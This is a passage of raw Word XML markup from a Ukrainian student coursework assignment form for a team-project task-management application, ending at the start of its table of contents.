      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>застосунку</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>організації</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> справ при</w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="-5" w:hanging="10"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>командній</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>роботі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> над </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t>проектами ”</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="-5" w:hanging="10"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Термін</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здачі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> студентом </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>закінченої</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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="369"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Початкові</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дані</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>до проекту</w:t>
      </w:r>
      <w:proofErr w:type="gram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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:u w:val="single" w:color="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="26" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00073DDF" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Зміст</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розрахунково-пояснювальної</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> записки (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>перелік</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питань</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які</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належить</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розробити</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">):   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>вступ</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аналіз</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специфіки</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предметної</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області</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проектування</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опис</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процесу</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роботи</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висновки</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перелік</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>посилань</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, код </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>програми</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                 </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="27" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="1"/>
        </w:numPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:hanging="369"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Перелік</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графічного</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матеріалу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> (з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>точним</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зазначенням</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обов’язкових</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>креслень</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">):  </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="28" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Завдання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F224D9">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> видано                            </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00F224D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8"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve">                  </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRPr="00F224D9" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="1" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00F224D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p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="00DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Завдання</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прийнято</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> до </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>виконання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">                                                </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC7E52">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
        <w:t xml:space="preserve">                                   </w:t>
      </w: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DC7E52" w:rsidP="00DC7E52">
      <w:pPr>
        <w:spacing w:after="3" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:eastAsia="ar-SA"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00DC7E52" w:rsidRDefault="001A6C53" w:rsidP="00F33D0A">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001A6C53">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ЗМІСТ</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D4056" w:rsidRPr="00AC0787" w:rsidRDefault="000D4056" w:rsidP="00F33D0A">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="10" w:hanging="10"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ВСТУП……………………………………………………………………………4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="001A6C53" w:rsidRPr="00AC0787" w:rsidRDefault="001A6C53" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ОБЗОР «ТЕМА РГЗ ИЗ 1-го СЕМЕСТРА» </w:t>
      </w:r>
      <w:r w:rsidR="00FD2581" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>………</w:t>
      </w:r>
      <w:r w:rsidR="000D4056" w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>……………………</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00FD2581" w:rsidRPr="00AC0787" w:rsidRDefault="00FD2581" w:rsidP="00F33D0A">
      <w:pPr>
        <w:pStyle w:val="a3"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Осн</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>ов</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>н</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC0787">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
